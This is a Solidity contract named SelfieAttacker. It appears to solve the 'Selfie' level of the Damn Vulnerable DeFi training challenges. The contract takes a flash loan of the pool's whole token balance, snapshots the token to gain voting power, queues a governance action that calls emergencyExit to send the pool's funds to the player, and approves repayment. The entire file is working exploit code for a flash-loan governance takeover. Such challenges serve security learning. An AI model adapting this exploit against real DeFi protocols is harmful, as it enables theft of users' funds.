// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "hardhat/console.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool selfiePool;
    DamnValuableTokenSnapshot damnValuableTokenSnapshot;
    SimpleGovernance simpleGovernance;

    address player;

    uint256 public actionId;

    constructor(SelfiePool _selfiePool, DamnValuableTokenSnapshot _damnValuableTokenSnapshot, SimpleGovernance _simpleGovernance) {
        selfiePool = _selfiePool;
        damnValuableTokenSnapshot = _damnValuableTokenSnapshot;
        simpleGovernance = _simpleGovernance;
        player = msg.sender;
    }

    function attack() external {
        uint256 balance = damnValuableTokenSnapshot.balanceOf(address(selfiePool));
        selfiePool.flashLoan(this, address(damnValuableTokenSnapshot), balance, "");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        damnValuableTokenSnapshot.snapshot();

        bytes memory fn = abi.encodeWithSignature("emergencyExit(address)", player);

        uint256 _actionId = simpleGovernance.queueAction(address(selfiePool), 0, fn);

        actionId = _actionId;

        damnValuableTokenSnapshot.approve(address(selfiePool), amount);

        return bytes32(keccak256("ERC3156FlashBorrower.onFlashLoan"));
    }
}
